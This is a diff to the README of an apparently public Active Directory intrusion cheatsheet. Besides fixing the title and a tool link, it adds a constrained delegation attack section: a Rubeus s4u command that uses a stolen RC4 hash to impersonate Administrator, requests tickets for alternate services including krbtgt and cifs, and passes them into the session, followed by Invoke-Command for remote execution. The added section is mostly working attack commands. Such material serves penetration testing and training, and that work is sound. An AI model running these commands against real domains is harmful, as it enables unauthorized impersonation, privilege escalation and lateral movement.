@@ -1,4 +1,4 @@
-# winddows-Active-Directory-Cheatsheet
+# Windows-Active-Directory-Cheatsheet
 
 A cheatsheet in order to help during intrusion steps on Windows environment.
 
@@ -61,7 +61,7 @@ A cheatsheet in order to help during intrusion steps on Windows environment.
 - [Lsassy](https://github.com/Hackndo/lsassy)
 - [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 - [Bloodhound](https://github.com/BloodHoundAD/BloodHound)
-- [Ldeep](https://github.com/franc-pentest/ldeep)
+- [Ldeep](https://github.com/tiyeuse/ldeep)
 - [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
 - [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) -> [Compiled Version](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases)
 - [FullPower](https://github.com/itm4n/FullPowers)
@@ -550,7 +550,14 @@ Goal: make a privileged user connect to our compromise machine.
 ```
 
 ##### Constrained Delegation
-TODO
+When a user owns the `msDS-AllowedToDelegateTo` attribute, we can abuse constrained delegation for the mentioned service and adding alternate services we takeover the object.
+```
+.\rubeus.exe s4u /user:<target_user> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/<target_machine.DOMAIN.FQDN> /altservice:ldap,http,wsman,host,winrm,krbtgt,cifs /ptt
+
+# We can get command execution with Invoke-Command for example
+$sess = New-PSSession -computername target_machine.DOMAIN.FQDN
+Invoke-Command -session $sess -ScriptBlock {whoami}
+```
 
 ##### Resource-Based Constrained Delegation
 If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate a Domain Administrator.
